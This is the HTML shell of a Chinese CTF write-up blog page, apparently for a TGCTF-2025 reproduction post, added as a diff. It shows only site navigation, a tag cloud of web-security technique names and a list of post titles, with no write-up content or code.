@@ -1,0 +1,1944 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>TGCTF-2025复现 | MIXBP</title>
+  <meta name="keywords" content=" sql注入 , 比赛复现 , upload , RCE , CVE , 目录穿越 , 内存马 , 时间盲注 ">
+  <meta name="description" content="TGCTF-2025复现 | MIXBP">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="description" content="CISCN2019华东南赛区-DoubleSecret1打开后看到这样一句话 1Welcome To Find Secret  尝试搜索页面，&#x2F;secret 然后又是提示信息 1Tell me your secret.I will encrypt it so others can&#x27;t see  让我们传入数值，然后他会给我们加密，我们随便输点东西。报错了  1234567891">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CISCN2019华东南赛区-DoubleSecret1">
+<meta property="og:url" content="https://mixbp.github.io/master/2025/04/15/CISCN2019%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-DoubleSecret1/index.html">
+<meta property="og:site_name" content="MIXBP">
+<meta property="og:description" content="CISCN2019华东南赛区-DoubleSecret1打开后看到这样一句话 1Welcome To Find Secret  尝试搜索页面，&#x2F;secret 然后又是提示信息 1Tell me your secret.I will encrypt it so others can&#x27;t see  让我们传入数值，然后他会给我们加密，我们随便输点东西。报错了  1234567891">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://mixbp.github.io/image/CISCN2019%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-DoubleSecret1-1.png">
+<meta property="article:published_time" content="2025-04-15T13:39:44.000Z">
+<meta property="article:modified_time" content="2025-04-15T13:54:53.355Z">
+<meta property="article:author" content="MIXBP">
+<meta property="article:tag" content="刷题笔记">
+<meta property="article:tag" content="信息搜集">
+<meta property="article:tag" content="RC4加密">
+<meta property="article:tag" content="ssti">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://mixbp.github.io/image/CISCN2019%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-DoubleSecret1-1.png">
+
+
+<link rel="icon" href="/img/avatar.jpg">
+
+<link href="/css/style.css?v=1.1.0" rel="stylesheet">
+
+<link href="/css/hl_theme/atom-light.css?v=1.1.0" rel="stylesheet">
+
+<link href="//cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css" rel="stylesheet">
+
+<script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+<script src="/js/titleTip.js?v=1.1.0" ></script>
+
+<script src="//cdn.jsdelivr.net/npm/highlightjs@9.16.2/highlight.pack.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>
+
+
+
+<script src="/js/iconfont.js?v=1.1.0" ></script>
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="">
+  <input class="theme_blog_path" value="">
+  <input id="theme_shortcut" value="true" />
+  <input id="theme_highlight_on" value="true" />
+  <input id="theme_code_copy" value="true" />
+</div>
+
+
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/"
+   class="avatar_target">
+    <img class="avatar"
+         src="/img/avatar.jpg"/>
+</a>
+<div class="author">
+    <span>MIXBP</span>
+</div>
+
+<div class="icon">
+    
+        
+            <a title="github"
+               href="https://mixbp.github.io/"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-github"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="email"
+               href="mailto:2439254357@qq.com"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-email"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="qq"
+               href="http://wpa.qq.com/msgrd?v=3&uin=2439254357&site=qq&menu=yes"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-qq"></use>
+                    </svg>
+                
+            </a>
+        
+    
+</div>
+
+
+
+    <a class="more-menus">更多菜单</a>
+
+
+
+<ul>
+    <li>
+        <div class="all active" data-rel="All">All
+            
+                <small>(90)</small>
+            
+        </div>
+    </li>
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+        
+            
+            
+                <a class="dynamic-menu "
+                   target="_self"
+                   
+                   href="https://mixbp.github.io/">MIXBP</a>
+        
+            
+                <a class="dynamic-menu "
+                   target="_blank"
+                        
+                   href="https://mixbp.github.io/">github</a>
+        
+    </div>
+    <div>
+        
+            <a class="about  hasFriend  site_url"
+               
+               href="/about">About</a>
+        
+        <a style="width: 50%"
+                
+                                           class="friends">Friends</a>
+        
+    </div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="90">
+<input type="hidden" id="yelog_site_word_count" value="179k">
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        Links
+        <i class="iconfont icon-left"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="https://mixbp.github.io/">MIXBP</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <div class="right-top">
+        <div id="default-panel">
+            <i class="iconfont icon-search" data-title="search shortcut key i"></i>
+            <div class="right-title">All</div>
+            <i class="iconfont icon-file-tree" data-title="switch to outline view shortcut key w"></i>
+        </div>
+        <div id="search-panel">
+            <i class="iconfont icon-left" data-title="return"></i>
+            <input id="local-search-input" autocomplete="off"/>
+            <label class="border-line" for="input"></label>
+            <i class="iconfont icon-case-sensitive" data-title="case sensitive"></i>
+            <i class="iconfont icon-tag" data-title="label"></i>
+        </div>
+        <div id="outline-panel" style="display: none">
+            <div class="right-title">outline</div>
+            <i class="iconfont icon-list" data-title="switch to article list"></i>
+        </div>
+    </div>
+
+    <div class="tags-list">
+    <input id="tag-search" />
+    <div class="tag-wrapper">
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>;%00截断代替#和-</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>.haccess</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>\转义单引号</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>$_SERVER[‘PHP_SELF’]</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>${phpinfo()}</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>报错注入</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>比赛复现</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>布尔盲注</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>代码审计</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>动态调用方法</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>短标签绕过</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>堆叠注入</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>二次注入</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>反序列化逃逸</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>反引号执行命令</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>空格过滤绕过</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>路径穿越</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>命令执行</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>目录穿越</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>内存马</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>取反绕过</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>日志包含</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>时间盲注</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>刷题笔记</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>特殊变量名传参</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>文件包含</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>文件读取</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>文件上传</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>无列名盲注</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>无列名注入</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>无字母数字RCE</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>信息搜集</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>学习笔记</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>异或盲注</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>异或绕过</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>长度过滤绕过</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>正则表达式</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>正则匹配查询</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>字符串逃逸</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>做题笔记</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>Apache SSI 远程命令执行漏洞</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>assert和eval</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>basename()函数</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>bottle</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>bottle框架</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>burpsuite爆破密码</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>chr函数构造命令</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>create_function()</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>CVE</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>data伪协议</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>delimiter更改sql语句结束符</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>escapeshellarg()和escapeshellcmd()、单引号逃逸</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>escapeshellarg和escapeshellcmd函数的绕过</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>extract覆盖函数</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>file伪协议</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>filter伪协议</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>Flask</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>fuzz测试</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>gc回收</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>git文件泄露与复原</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>githacker</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>glob函数</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>handler读表</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>HTML</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>http协议</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>idna编码特性</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>intval</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>json绕过</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>jwt密钥爆破</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>jwt身份伪造</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>linux</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>linux find -name模糊查询文件</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>Linux特殊文件</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>MariaDB数据库</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>md5</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>md5碰撞</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>mt_srand伪随机数漏洞</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>MySQL</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>nginx</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>nmap</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>payload构造</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>perl语言漏洞</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>php</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>php_mt_seed工具</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>php7 segment fault 特性</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>php反序列化</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>PHP反序列化漏洞</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>php特性</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>php伪协议</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>PHP原生类</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>pickle</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>pickle反序列化漏洞</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>python</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>Python-Flask框架审计</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>python代码审计</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>python反弹shell</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>python反序列化</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>python脚本编写</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>RC4加密</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>RCE</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>regexp注入</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>reverse</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>select load_file读取文件</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>shell写入</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>sql加号运算注入</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>sql盲注</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>sql语句闭合</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>sql注入</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>ssrf</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>ssti</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>str_replace</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>swp泄露</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>sys数据库</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>unicode</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>upload</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>waf绕过</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>xss</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>xss漏洞</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>xxe</a>
+            </li>
+        
+    </div>
+
+</div>
+
+    
+    <div id="local-search-result">
+
+    </div>
+    
+    <nav id="title-list-nav">
+        
+        
+        <a  class="All "
+           href="/2025/04/15/BJDCTF2020-EzPHP/"
+           data-tag="刷题笔记,代码审计,php特性,create_function()"
+           data-author="" >
+            <span class="post-title" title="BJDCTF2020-EzPHP">BJDCTF2020-EzPHP</span>
+            <span class="post-date" title="2025-04-15 22:02:22">2025/04/15</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/04/15/CISCN2019%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-DoubleSecret1/"
+           data-tag="刷题笔记,信息搜集,RC4加密,ssti"
+           data-author="" >
+            <span class="post-title" title="CISCN2019华东南赛区-DoubleSecret1">CISCN2019华东南赛区-DoubleSecret1</span>
+            <span class="post-date" title="2025-04-15 21:39:44">2025/04/15</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/04/15/TGCTF-2025%E5%A4%8D%E7%8E%B0/"
+           data-tag="sql注入,比赛复现,upload,RCE,CVE,目录穿越,内存马,时间盲注"
+           data-author="" >
+            <span class="post-title" title="TGCTF-2025复现">TGCTF-2025复现</span>
+            <span class="post-date" title="2025-04-15 14:10:07">2025/04/15</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/04/14/XYCTF-%E5%87%BA%E9%A2%98%E4%BA%BA%E5%8F%88%E7%96%AF/"
+           data-tag="ssti,比赛复现,bottle框架"
+           data-author="" >
+            <span class="post-title" title="XYCTF-出题人又疯">XYCTF-出题人又疯</span>
+            <span class="post-date" title="2025-04-14 19:51:02">2025/04/14</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/04/14/XYCTF-%E5%87%BA%E9%A2%98%E4%BA%BA%E5%B7%B2%E7%96%AF/"
+           data-tag="ssti,比赛复现,bottle框架,长度过滤绕过"
+           data-author="" >
+            <span class="post-title" title="XYCTF-出题人已疯">XYCTF-出题人已疯</span>
+            <span class="post-date" title="2025-04-14 19:50:50">2025/04/14</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/04/14/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="python反序列化">python反序列化</span>
+            <span class="post-date" title="2025-04-14 19:09:56">2025/04/14</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/04/14/SUCTF2019-EasyWeb/"
+           data-tag="文件上传,.haccess,无字母数字RCE,异或绕过"
+           data-author="" >
+            <span class="post-title" title="SUCTF2019-EasyWeb">SUCTF2019-EasyWeb</span>
+            <span class="post-date" title="2025-04-14 17:33:10">2025/04/14</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/04/14/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Unfinish/"
+           data-tag="刷题笔记,sql盲注,二次注入,sql加号运算注入"
+           data-author="" >
+            <span class="post-title" title="网鼎杯2018-Unfinish">网鼎杯2018-Unfinish</span>
+            <span class="post-date" title="2025-04-14 17:16:41">2025/04/14</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/04/13/TGCTF-2025wp/"
+           data-tag="比赛复现"
+           data-author="" >
+            <span class="post-title" title="TGCTF-2025">TGCTF-2025</span>
+            <span class="post-date" title="2025-04-13 15:53:03">2025/04/13</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/04/08/HarekazeCTF2019-encode-and-encode/"
+           data-tag="代码审计,php伪协议,json绕过"
+           data-author="" >
+            <span class="post-title" title="HarekazeCTF2019-encode_and_encode">HarekazeCTF2019-encode_and_encode</span>
+            <span class="post-date" title="2025-04-08 22:03:57">2025/04/08</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/04/08/XYCTF2025-Signin/"
+           data-tag="路径穿越,bottle,pickle反序列化漏洞"
+           data-author="" >
+            <span class="post-title" title="Signin">Signin</span>
+            <span class="post-date" title="2025-04-08 21:24:15">2025/04/08</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/04/08/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Comment/"
+           data-tag="代码审计,二次注入,burpsuite爆破密码,git文件泄露与复原,githacker,select load_file读取文件"
+           data-author="" >
+            <span class="post-title" title="网鼎杯2018-Comment">网鼎杯2018-Comment</span>
+            <span class="post-date" title="2025-04-08 14:08:27">2025/04/08</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/04/07/NCTF2019-SQLi1/"
+           data-tag="布尔盲注,;%00截断代替#和-,regexp注入,\转义单引号"
+           data-author="" >
+            <span class="post-title" title="NCTF2019-SQLi1">NCTF2019-SQLi1</span>
+            <span class="post-date" title="2025-04-07 20:53:16">2025/04/07</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/04/06/NPUCTF2020-ezinclude/"
+           data-tag="文件包含,md5,php7 segment fault 特性"
+           data-author="" >
+            <span class="post-title" title="NPUCTF2020-ezinclude">NPUCTF2020-ezinclude</span>
+            <span class="post-date" title="2025-04-06 20:47:19">2025/04/06</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/04/06/CISCN2019%E6%80%BB%E5%86%B3%E8%B5%9BDay2Web1-Easyweb/"
+           data-tag="sql盲注,sql语句闭合,str_replace,文件上传,短标签绕过"
+           data-author="" >
+            <span class="post-title" title="CISCN2019总决赛Day2Web1-Easyweb">CISCN2019总决赛Day2Web1-Easyweb</span>
+            <span class="post-date" title="2025-04-06 17:33:52">2025/04/06</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/04/06/GYCTF2020-Ezsqli/"
+           data-tag="fuzz测试,布尔盲注,sys数据库,无列名注入,无列名盲注"
+           data-author="" >
+            <span class="post-title" title="GYCTF2020-Ezsqli">GYCTF2020-Ezsqli</span>
+            <span class="post-date" title="2025-04-06 16:32:21">2025/04/06</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/04/06/HFCTF2020-EasyLogin/"
+           data-tag="jwt身份伪造"
+           data-author="" >
+            <span class="post-title" title="HFCTF2020-EasyLogin">HFCTF2020-EasyLogin</span>
+            <span class="post-date" title="2025-04-06 14:25:50">2025/04/06</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/04/02/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E7%99%BD%E8%99%8E%E7%BB%84-PicDown/"
+           data-tag="文件读取,Python-Flask框架审计,Linux特殊文件,python反弹shell"
+           data-author="" >
+            <span class="post-title" title="网鼎杯2020白虎组-PicDown">网鼎杯2020白虎组-PicDown</span>
+            <span class="post-date" title="2025-04-02 21:38:54">2025/04/02</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/04/02/HITCON2017-SSRFme/"
+           data-tag="代码审计,ssrf,data伪协议,file伪协议,perl语言漏洞"
+           data-author="" >
+            <span class="post-title" title="HITCON2017-SSRFme">HITCON2017-SSRFme</span>
+            <span class="post-date" title="2025-04-02 20:57:08">2025/04/02</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/04/02/RCTF2015-EasySQL/"
+           data-tag="刷题笔记,二次注入,报错注入,正则匹配查询,reverse"
+           data-author="" >
+            <span class="post-title" title="RCTF2015-EasySQL">RCTF2015-EasySQL</span>
+            <span class="post-date" title="2025-04-02 17:21:06">2025/04/02</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/04/02/CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADayWeb2-ikun/"
+           data-tag="刷题笔记,python反序列化,jwt密钥爆破,pickle"
+           data-author="" >
+            <span class="post-title" title="CISCN2019华北赛区DayWeb2-ikun">CISCN2019华北赛区DayWeb2-ikun</span>
+            <span class="post-date" title="2025-04-02 17:20:50">2025/04/02</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/04/02/GWCTF2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96/"
+           data-tag="刷题笔记,mt_srand伪随机数漏洞,php_mt_seed工具"
+           data-author="" >
+            <span class="post-title" title="GWCTF2019-枯燥的抽奖">GWCTF2019-枯燥的抽奖</span>
+            <span class="post-date" title="2025-04-02 17:20:11">2025/04/02</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/04/01/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF2021-write-shell/"
+           data-tag="刷题笔记,短标签绕过,shell写入,空格过滤绕过,反引号执行命令"
+           data-author="" >
+            <span class="post-title" title="红明谷CTF2021-write_shell">红明谷CTF2021-write_shell</span>
+            <span class="post-date" title="2025-04-01 15:39:04">2025/04/01</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/31/Zer0pts2020-Can-you-guess-it/"
+           data-tag="刷题笔记,代码审计,$_SERVER[‘PHP_SELF’],basename()函数"
+           data-author="" >
+            <span class="post-title" title="Zer0pts2020-Can+you+guess+it">Zer0pts2020-Can+you+guess+it</span>
+            <span class="post-date" title="2025-03-31 15:51:54">2025/03/31</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/30/SUCTF2019-Pythonginx/"
+           data-tag="idna编码特性,python代码审计,nginx"
+           data-author="" >
+            <span class="post-title" title="SUCTF2019-Pythonginx">SUCTF2019-Pythonginx</span>
+            <span class="post-date" title="2025-03-30 20:21:20">2025/03/30</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/30/CISCN2019%E5%88%9D%E8%B5%9B-LoveMath/"
+           data-tag="刷题笔记"
+           data-author="" >
+            <span class="post-title" title="CISCN2019初赛-LoveMath">CISCN2019初赛-LoveMath</span>
+            <span class="post-date" title="2025-03-30 16:21:31">2025/03/30</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/30/BJDCTF2020-EasySearch1/"
+           data-tag="刷题笔记,swp泄露,md5碰撞,代码审计,Apache SSI 远程命令执行漏洞"
+           data-author="" >
+            <span class="post-title" title="BJDCTF2020-EasySearch1">BJDCTF2020-EasySearch1</span>
+            <span class="post-date" title="2025-03-30 14:24:01">2025/03/30</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/29/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-FinalSQL/"
+           data-tag="刷题笔记,sql盲注,sql注入,异或盲注"
+           data-author="" >
